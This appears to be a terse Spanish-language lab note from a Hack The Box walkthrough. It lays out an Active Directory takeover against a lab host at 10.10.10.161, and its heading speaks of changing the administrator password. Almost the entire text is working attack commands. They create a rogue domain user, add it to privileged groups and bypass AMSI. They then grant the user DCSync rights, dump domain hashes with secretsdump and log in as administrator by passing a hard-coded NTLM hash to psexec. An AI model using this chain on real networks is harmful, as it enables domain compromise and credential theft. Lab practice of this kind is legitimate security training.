
# CAMBIAR CONTRASEÑA AL ADMINISTRADOR.
```shell
# CREAR USUARIO
net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add
Bypass-4MSI

#HACER EN UNA POWERSHELL
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

#EN LA MÁQUINA LOCAL
❯ secretsdump.py htb/john@10.10.10.161
❯ psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
